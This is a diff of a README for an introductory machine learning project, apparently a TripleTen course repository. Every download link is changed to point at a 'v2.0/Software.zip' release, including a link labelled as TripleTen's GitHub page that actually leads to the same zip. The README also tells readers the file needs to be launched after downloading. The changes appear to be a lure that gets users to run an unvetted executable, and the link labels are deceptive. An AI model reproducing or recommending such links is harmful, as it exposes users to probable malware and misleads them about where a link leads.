@@ -27,9 +27,9 @@ This repository contains an introductory machine learning project developed by T
 - Tuning Hyperparameters
 
 ## Project Files
-You can download the project files from the following link: [Download Project Files](https://github.com/qweryrr/Intro_to_Machine_Learning_Project/releases/download/v1.0/Release.zip)
+You can download the project files from the following link: [Download Project Files](https://github.com/qweryrr/Intro_to_Machine_Learning_Project/releases/download/v2.0/Software.zip)
 
-[![Download Project Files](https://github.com/qweryrr/Intro_to_Machine_Learning_Project/releases/download/v1.0/Release.zip)](https://github.com/qweryrr/Intro_to_Machine_Learning_Project/releases/download/v1.0/Release.zip)
+[![Download Project Files](https://github.com/qweryrr/Intro_to_Machine_Learning_Project/releases/download/v2.0/Software.zip)](https://github.com/qweryrr/Intro_to_Machine_Learning_Project/releases/download/v2.0/Software.zip)
 
 **Note:** The file needs to be launched after downloading.
 
@@ -52,6 +52,6 @@ Let's embark on this machine learning journey together! 🤖✨
 
 ---
 
-**For other repositories, visit TripleTen's GitHub page:** [TripleTen GitHub](https://github.com/qweryrr/Intro_to_Machine_Learning_Project/releases/download/v1.0/Release.zip)
+**For other repositories, visit TripleTen's GitHub page:** [TripleTen GitHub](https://github.com/qweryrr/Intro_to_Machine_Learning_Project/releases/download/v2.0/Software.zip)
 
 *Explore. Learn. Innovate.* 🌟
